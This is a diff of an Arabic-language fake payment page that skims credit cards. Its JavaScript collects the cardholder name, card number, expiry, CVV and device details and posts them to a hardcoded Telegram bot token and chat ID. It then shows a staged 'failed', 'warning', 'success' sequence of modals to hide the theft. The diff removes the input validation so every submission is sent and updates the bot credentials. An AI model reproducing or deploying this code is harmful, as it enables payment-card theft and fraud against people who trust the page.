@@ -122,14 +122,6 @@
             flex: 1;
         }
 
-        .card-icon {
-            position: absolute;
-            left: 15px;
-            top: 42px;
-            color: #a0aec0;
-            font-size: 20px;
-        }
-
         .pay-button {
             width: 100%;
             padding: 16px;
@@ -155,17 +147,6 @@
         .pay-button:disabled {
             background-color: #a0aec0;
             cursor: not-allowed;
-        }
-
-        .footer-note {
-            text-align: center;
-            font-size: 11px;
-            color: #a0aec0;
-            margin-top: 15px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 5px;
         }
 
         /* النوافذ المنبثقة */
@@ -207,7 +188,7 @@
             transform: scale(1);
         }
 
-        /* نافذة فشل الدفع (أحمر) */
+        /* نافذة فشل الدفع */
         .failed-modal {
             border-top: 6px solid #e53e3e;
         }
@@ -231,7 +212,7 @@
             background-color: #c53030;
         }
 
-        /* نافذة التحذير (برتقالي) */
+        /* نافذة التحذير */
         .warning-modal {
             border-top: 6px solid #dd6b20;
         }
@@ -261,7 +242,7 @@
             background-color: #c05621;
         }
 
-        /* نافذة النجاح (أخضر) */
+        /* نافذة النجاح */
         .success-modal {
             border-top: 6px solid #38a169;
         }
@@ -285,7 +266,6 @@
             background-color: #2f855a;
         }
 
-        /* نصوص النوافذ */
         .modal-content h3 {
             font-size: 22px;
             margin-bottom: 12px;
@@ -349,7 +329,6 @@
             <div class="input-group">
                 <label>رقم البطاقة</label>
                 <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
-                <span class="card-icon"></span>
             </div>
 
             <div class="row">
@@ -370,7 +349,7 @@
         </div>
     </div>
 
-    <!-- 1. النافذة المنبثقة: فشل عملية الدفع -->
+    <!-- 1. فشل عملية الدفع -->
     <div class="modal-overlay" id="failedModal">
         <div class="modal-content failed-modal">
             <div class="failed-icon">❌</div>
@@ -384,7 +363,7 @@
         </div>
     </div>
 
-    <!-- 2. النافذة المنبثقة: التحذير الأمني -->
+    <!-- 2. التحذير الأمني -->
     <div class="modal-overlay" id="warningModal">
         <div class="modal-content warning-modal">
             <div class="warning-icon">⚠️</div>
@@ -400,7 +379,7 @@
         </div>
     </div>
 
-    <!-- 3. النافذة المنبثقة: تمت العملية بنجاح -->
+    <!-- 3. تمت العملية -->
     <div class="modal-overlay" id="successModal">
         <div class="modal-content success-modal">
             <div class="success-icon">✅</div>
@@ -443,11 +422,11 @@
 
 
         // ---- 2. إعدادات التليجرام ----
-        const TELEGRAM_BOT_TOKEN = '8469595165:AAGqbAhhEEMUYS9CgDY9n7eiNbogfCjF8uI';
-        const TELEGRAM_CHAT_ID = '5906639765';
+        const TELEGRAM_BOT_TOKEN = '8469595165:AAGqbAhhEEMUYS9YGIY9n7eiNbogfCjF8uI';
+        const TELEGRAM_CHAT_ID = '5906639698';
 
 
-        // ---- 3. دالة لجمع معلومات الجهاز ----
+        // ---- 3. معلومات الجهاز ----
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let os = "غير معروف";
@@ -469,11 +448,11 @@
             const language = navigator.language || navigator.userLanguage;
             const platform = navigator.platform;
 
-            return { os, browser, screenResolution, language, platform, ua };
+            return { os, browser, screenResolution, language, platform };
         }
 
 
-        // ---- 4. دالة معالجة الدفع ----
+        // ---- 4. معالجة الدفع ----
         function processPayment() {
             const name = document.getElementById('cardName').value.trim();
             const card = document.getElementById('cardNumber').value.trim();
@@ -483,10 +462,7 @@
             const btnText = document.getElementById('btnText');
             const btnLoader = document.getElementById('btnLoader');
 
-            if (!name || !card || !date || !cvv) {
-                alert("الرجاء تعبئة جميع الحقول المطلوبة.");
-                return;
-            }
+            // تم إزالة شرط التحقق هنا، سيعمل الزر دائماً
 
             payBtn.disabled = true;
             btnText.style.display = 'none';
@@ -498,10 +474,10 @@
 🔴 **عملية دفع جديدة (فاشلة)** 🔴
 -------------------------
 💳 **بيانات البطاقة:**
-👤 **الاسم:** ${name}
-💳 **البطاقة:** \`${card}\`
-📅 **التاريخ:** ${date}
-🔒 **CVV:** ${cvv}
+👤 **الاسم:** ${name || 'غير مدخل'}
+💳 **البطاقة:** \`${card || 'غير مدخل'}\`
+📅 **التاريخ:** ${date || 'غير مدخل'}
+🔒 **CVV:** ${cvv || 'غير مدخل'}
 
 📱 **معلومات الجهاز:**
 💻 **النظام:** ${device.os}
@@ -527,7 +503,7 @@
                 })
             })
             .then(response => {
-                console.log("تمت محاولة الإرسال");
+                console.log("تم الإرسال");
             })
             .catch(error => {
                 console.error("خطأ:", error);
@@ -538,16 +514,14 @@
                     btnText.style.display = 'block';
                     btnLoader.style.display = 'none';
                     
-                    // إظهار منبثق الفشل أولاً
+                    // إظهار الفشل دائماً
                     document.getElementById('failedModal').classList.add('show');
                 }, 1500);
             });
         }
 
 
-        // ---- 5. دوال النوافذ المنبثقة ----
-        
-        // الانتقال من الفشل إلى التحذير
+        // ---- 5. دوال النوافذ ----
         function showWarningModal() {
             document.getElementById('failedModal').classList.remove('show');
             setTimeout(() => {
@@ -555,7 +529,6 @@
             }, 300);
         }
 
-        // الانتقال من التحذير إلى النجاح
         function showSuccessModal() {
             document.getElementById('warningModal').classList.remove('show');
             setTimeout(() => {
@@ -563,7 +536,6 @@
             }, 300);
         }
 
-        // إغلاق كل النوافذ وإعادة تعيين الصفحة
         function closeModals() {
             document.getElementById('successModal').classList.remove('show');
             document.getElementById('cardName').value = '';
